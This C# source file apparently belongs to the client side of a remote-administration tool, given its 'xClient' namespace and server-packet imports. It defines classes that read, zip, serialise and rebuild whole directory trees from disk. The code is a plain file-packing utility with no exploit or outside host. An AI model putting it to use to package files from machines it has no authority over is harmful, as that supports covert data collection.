using System.Collections.Generic;
using System.IO;
using xClient.Core.Compression.Zip;
using xClient.Core.Compression.Zip.Core;
using xClient.Core.Packets.ServerPackets;

namespace xClient.Core.Utilities
{
    public class VirtualFile
    {
        public long Size { get; set; }
        public string Name { get; set; }
        public bool Compressed { get; set; }

        public static VirtualFile Create(string path, bool compressed = false)
        {
            var fi = new FileInfo(path);
            var name = fi.Name;
            var size = fi.Length;
            byte[] data;

            if (compressed)
            {
                using (var msOut = new MemoryStream())
                using (var msIn = new FileStream(path, FileMode.Open, FileAccess.Read))
                using (var zip = new ZipOutputStream(msOut))
                {
                    zip.SetLevel(3);
                    var entry = new ZipEntry(fi.Name);
                    zip.PutNextEntry(entry);
                    StreamUtils.Copy(msIn, zip, new byte[4096]);
                    zip.CloseEntry();

                    zip.IsStreamOwner = false;
                    zip.Close();
                    msOut.Position = 0;
                    data = msOut.ToArray();
                    name += ".zip";
                    size = msOut.Length;
                }
            }
            else
                data = File.ReadAllBytes(path);

            return new VirtualFile(size, name, data, compressed);
        }

        public static VirtualFile Create(long size, string name, byte[] data, bool compressed)
        {
            return new VirtualFile(size, name, data, compressed);
        }

        public byte[] Data { get; set; }
        public VirtualFile(long size, string name, byte[] data, bool compressed = false)
        {
            Size = size;
            Name = name;
            Data = data;
            Compressed = compressed;
        }
    }
    public class VirtualDirectory
    {
        public string Name { get; set; }

        public List<VirtualDirectory> SubDirectories { get; set; }
        public List<VirtualFile> Files { get; set; }
        public List<string> Items { get; set; }
        public bool Verified { get; private set; }
        public bool Compressed { get; private set; }
        public long Size { get { return Serialize().Length; } }

        private readonly Dictionary<string, ItemOption> _itemOptions;
        private readonly byte[] _data;
        private readonly string _rootPath;
        internal const int Magic = 0x0BBE101;

        public VirtualDirectory()
        {
            SubDirectories = new List<VirtualDirectory>();
            Files = new List<VirtualFile>();
        }

        public VirtualDirectory(string path, string[] items = null, ItemOption[] itemOptions = null)
        {
            SubDirectories = new List<VirtualDirectory>();
            Files = new List<VirtualFile>();
            Items = new List<string>(items == null ? new string[] { } : items);
            _itemOptions = new Dictionary<string, ItemOption>();
            _rootPath = path;
            Name = new DirectoryInfo(path).Name;

            if(itemOptions != null && Items.Count == itemOptions.Length)
                for (int i = 0; i < Items.Count; i++)
                    _itemOptions.Add(Path.Combine(_rootPath, Items[i]), itemOptions[i]);

            LoadSubdirectories();
            LoadFiles();
            _data = Serialize();
        }

        public static VirtualDirectory Create(string path)
        {
            return new VirtualDirectory(path);
        }

        public static VirtualDirectory Create(string path, string[] items)
        {
            return new VirtualDirectory(path, items);
        }

        public static VirtualDirectory Create(string path, string[] items, ItemOption[] itemOptions)
        {
            return new VirtualDirectory(path, items, itemOptions);
        }

        public byte[] Serialize()
        {
            if (_data != null)
                return _data;

            using (var ms = new MemoryStream())
            using (var bw = new BinaryWriter(ms))
            {
                bw.Write(Magic);
                bw.Write(Name);
                bw.Write(SubDirectories.Count);
                bw.Write(Files.Count);

                foreach (var subDir in SubDirectories)
                {
                    bw.Write(subDir.Size);
                    bw.Write(subDir.Serialize());
                }

                foreach (var file in Files)
                {
                    bw.Write(file.Name);
                    bw.Write(file.Size);
                    bw.Write(file.Data);
                }

                if (Compressed)
                {
                    return ms.ToArray();
                }
                else
                {
                    return ms.ToArray();
                }
            }
        }

        public VirtualDirectory DeSerialize(string path)
        {
            VirtualDirectory val;
            using (var fs = new FileStream(path, FileMode.Open, FileAccess.Read))
                val = DeSerialize(fs);

            return val;
        }

        public VirtualDirectory DeSerialize(byte[] data)
        {
            VirtualDirectory val;
            using (var ms = new MemoryStream(data))
                val = DeSerialize(ms);

            return val;
        }

        private VirtualDirectory DeSerialize(Stream data)
        {
            var rootDir = new VirtualDirectory();
            using (var br = new BinaryReader(data))
            {
                Verified = br.ReadInt32() == Magic;
                rootDir.Name = br.ReadString();
                var subDirCount = br.ReadInt32();
                var fileCount = br.ReadInt32();

                for (int i = 0; i < subDirCount; i++)
                {
                    var size = br.ReadInt64();
                    var subDirBuf = br.ReadBytes((int)size);
                    rootDir.SubDirectories.Add(DeSerialize(subDirBuf));
                }

                for (int i = 0; i < fileCount; i++)
                {
                    var name = br.ReadString();
                    var size = br.ReadInt64();
                    var fileData = br.ReadBytes((int)size);
                    rootDir.Files.Add(new VirtualFile(size, name, fileData));
                }

                return rootDir;
            }
        }

        public void SaveToDisk(string path)
        {
            try
            {
                Directory.CreateDirectory(Path.Combine(path, Name));
            }
            catch
            {

            }

            foreach (var subDir in SubDirectories)
                subDir.SaveToDisk(Path.Combine(path, Name));

            foreach (var file in Files)
                File.WriteAllBytes(Path.Combine(path, Name, file.Name), file.Data);
        }

        private void LoadSubdirectories()
        {
            foreach (var dir in Directory.GetDirectories(_rootPath))
            {
                if (_itemOptions.ContainsKey(Path.Combine(_rootPath, dir)) && _itemOptions[dir] == ItemOption.Compress)
                {
                    using (var ms = new MemoryStream())
                    {
                        var zip = new FastZip();
                        ZipOutputStream outZip;
                        zip.CreateZip(ms, Path.Combine(_rootPath, dir), true, null, null, out outZip);

                        outZip.Finish();
                        // IMPORTANT! outZip must be closed after use here
                        Files.Add(VirtualFile.Create(ms.Length, new DirectoryInfo(dir).Name + ".zip", ms.ToArray(), true));
                        outZip.Close();
                        outZip.Dispose();
                    }
                }
                else
                    SubDirectories.Add(Create(dir));
            }
        }

        private void LoadFiles()
        {
            foreach (var file in Directory.GetFiles(_rootPath))
            {
                if (_itemOptions.ContainsKey(Path.Combine(_rootPath, file)) && _itemOptions[file] == ItemOption.Compress)
                    Files.Add(VirtualFile.Create(file, true));
                else
                    Files.Add(VirtualFile.Create(file));
            }
        }
    }
}
